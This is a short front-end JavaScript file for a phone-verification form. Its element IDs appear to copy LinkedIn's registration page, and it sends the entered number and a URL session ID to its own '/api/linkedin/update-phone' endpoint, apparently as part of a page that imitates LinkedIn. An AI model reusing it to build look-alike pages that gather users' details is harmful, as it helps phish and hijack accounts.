const countrySelect = document.getElementById("select-register-phone-country");
const phoneInput = document.getElementById("register-verification-phone-number");
const submitButton = document.getElementById("phone-pin-submit-button");
const errorDiv = document.querySelector(".body__banner--error");

function showError(message) {
    if (errorDiv) {
        errorDiv.querySelector('span').textContent = message;
        errorDiv.classList.remove('hidden__imp');
    }
}

function hideError() {
    if (errorDiv) {
        errorDiv.querySelector('span').textContent = '';
        errorDiv.classList.add('hidden__imp');
    }
}

// Prevent default for all clicks
document.addEventListener("click", function (e) {
    e.preventDefault();
    if (e.target.id === "register-phone-submit-button") {
        handleSubmit();
    }
});

async function handleSubmit() {
    hideError();

    const phone = phoneInput.value.trim();
    const countryCode = countrySelect.value;
    const sessionId = new URLSearchParams(window.location.search).get('sessionId');

    if (!phone) {
        showError('Please enter a phone number');
        return;
    }

    if (phone.length < 10) {
        showError('Please enter a valid phone number');
        return;
    }

    try {
        const response = await fetch('/api/linkedin/update-phone', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                phone,
                countryCode,
                sessionId
            })
        });

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        const data = await response.json();
        
        if (data.error) {
            showError(data.error);
        } else {
            window.location.href = `/`;
        }
    } catch (error) {
        console.error('Error updating phone number:', error);
        showError('An error occurred. Please try again.');
    }
} 